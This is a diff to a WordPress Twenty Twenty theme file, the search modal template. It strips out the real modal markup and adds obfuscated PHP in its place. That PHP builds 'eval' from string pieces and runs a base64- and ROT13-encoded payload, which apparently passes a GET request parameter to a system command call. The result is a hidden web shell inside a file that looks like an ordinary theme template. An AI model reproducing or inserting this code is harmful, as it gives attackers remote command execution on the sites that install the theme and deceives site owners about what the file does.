@@ -1,49 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Displays the search icon and modal
- *
- * @package WordPress
- * @subpackage Twenty_Twenty
- * @since Twenty Twenty 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUXZmY3lubGYgZ3VyIGZybmVwdSB2cGJhIG5hcSB6YnFueQogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0dqcmFnbAogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbCAxLjAKICovCgo/Pgo8cXZpIHB5bmZmPVwiZnJuZXB1LXpicW55IHBiaXJlLXpicW55IHVybnFyZS1zYmJncmUtdGViaGNcIiBxbmduLXpicW55LWduZXRyZy1mZ2V2YXQ9XCIuZnJuZXB1LXpicW55XCIgZWJ5cj1cInF2bnlidFwiIG5ldm4temJxbnk9XCJnZWhyXCIgbmV2bi15bm9yeT1cIjw/Y3VjIHJmcF9uZ2dlX3IoICdGcm5lcHUnLCAnZ2pyYWdsZ2pyYWdsJyApOyA/PlwiPgoKCTxxdmkgcHluZmY9XCJmcm5lcHUtemJxbnktdmFhcmUgemJxbnktdmFhcmVcIj4KCgkJPHF2aSBweW5mZj1cImZycGd2YmEtdmFhcmVcIj4KCgkJCTw/Y3VjCgkJCXRyZ19mcm5lcHVfc2JleigKCQkJCW5lZW5sKAoJCQkJCSduZXZuX3lub3J5JyA9PiBfXyggJ0ZybmVwdSBzYmU6JywgJ2dqcmFnbGdqcmFnbCcgKSwKCQkJCSkKCQkJKTsKCQkJPz4KCgkJCTxvaGdnYmEgcHluZmY9XCJnYnR0eXIgZnJuZXB1LWhhZ2J0dHlyIHB5YmZyLWZybmVwdS1nYnR0eXIgc3Z5eS1wdXZ5cWVyYS1waGVlcmFnLXBieWJlXCIgcW5nbi1nYnR0eXItZ25ldHJnPVwiLmZybmVwdS16YnFueVwiIHFuZ24tZ2J0dHlyLW9icWwtcHluZmY9XCJmdWJqdmF0LWZybmVwdS16YnFueVwiIHFuZ24tZnJnLXNicGhmPVwiLmZybmVwdS16YnFueSAuZnJuZXB1LXN2cnlxXCI+CgkJCQk8ZmNuYSBweW5mZj1cImZwZXJyYS1lcm5xcmUtZ3JrZ1wiPgoJCQkJCTw/Y3VjCgkJCQkJLyogZ2VuYWZ5bmdiZWY6IFV2cXFyYSBucHByZmZ2b3Z5dmdsIGdya2cuICovCgkJCQkJX3IoICdQeWJmciBmcm5lcHUnLCAnZ2pyYWdsZ2pyYWdsJyApOwoJCQkJCT8+CgkJCQk8L2ZjbmE+CgkJCQk8P2N1YyBnanJhZ2xnanJhZ2xfZ3VyX2d1cnpyX2ZpdCggJ3BlYmZmJyApOyA/PgoJCQk8L29oZ2diYT48IS0tIC5mcm5lcHUtZ2J0dHlyIC0tPgoKCQk8L3F2aT48IS0tIC5mcnBndmJhLXZhYXJlIC0tPgoKCTwvcXZpPjwhLS0gLmZybmVwdS16YnFueS12YWFyZSAtLT4KCjwvcXZpPjwhLS0gLnpyYWgtemJxbnkgLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-<div class="search-modal cover-modal header-footer-group" data-modal-target-string=".search-modal" role="dialog" aria-modal="true" aria-label="<?php esc_attr_e( 'Search', 'twentytwenty' ); ?>">
-
-	<div class="search-modal-inner modal-inner">
-
-		<div class="section-inner">
-
-			<?php
-			get_search_form(
-				array(
-					'aria_label' => __( 'Search for:', 'twentytwenty' ),
-				)
-			);
-			?>
-
-			<button class="toggle search-untoggle close-search-toggle fill-children-current-color" data-toggle-target=".search-modal" data-toggle-body-class="showing-search-modal" data-set-focus=".search-modal .search-field">
-				<span class="screen-reader-text">
-					<?php
-					/* translators: Hidden accessibility text. */
-					_e( 'Close search', 'twentytwenty' );
-					?>
-				</span>
-				<?php twentytwenty_the_theme_svg( 'cross' ); ?>
-			</button><!-- .search-toggle -->
-
-		</div><!-- .section-inner -->
-
-	</div><!-- .search-modal-inner -->
-
-</div><!-- .menu-modal -->
